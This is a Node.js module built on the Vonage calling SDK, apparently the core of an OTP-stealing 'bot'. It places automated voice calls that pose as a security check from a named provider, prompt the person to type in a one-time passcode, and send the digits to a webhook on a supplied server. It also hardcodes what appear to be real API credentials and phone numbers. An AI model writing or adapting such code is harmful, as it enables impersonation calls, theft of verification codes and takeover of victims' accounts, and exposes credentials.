const Vonage = require("@vonage/server-sdk");

const vonage = new Vonage({
  apiKey: "4d29e6ec",
  apiSecret: "YRWwRIAnSRXAUO0x",
  applicationId: "0d6cda3f-0171-480e-9812-6db2c2609ca7",
  privateKey: "./private.key",
});

const call = (number, provider, protocol, serverhost) => {
  vonage.calls.create(
    {
      to: [
        {
          type: "phone",
          number: number, // "19712647080",
        },
      ],
      from: {
        type: "phone",
        number: "12019775633",
      },
      ncco: [
        {
          action: "talk",
          text: `<speak><prosody volume='x-loud' rate='slow'><p>this is a security check from ${provider}</p> <p>we have sent you a message with a one time passcode</p> <p>please enter the code by dailing the digits on the keypad followed by the hash key in order to verify your account</p></prosody></speak>`,
        },
        {
          action: "input",
          type: ["dtmf"],
          dtmf: {
            timeOut: 10,
            maxDigits: 15,
            submitOnHash: true,
          },
          eventUrl: [`${protocol}://${serverhost}/webhooks/dtmf`],
        },
      ],
    },
    (error, response) => {
      if (error) console.error(error);
      if (response) console.log(response);
    }
  );
};

module.exports = { call };
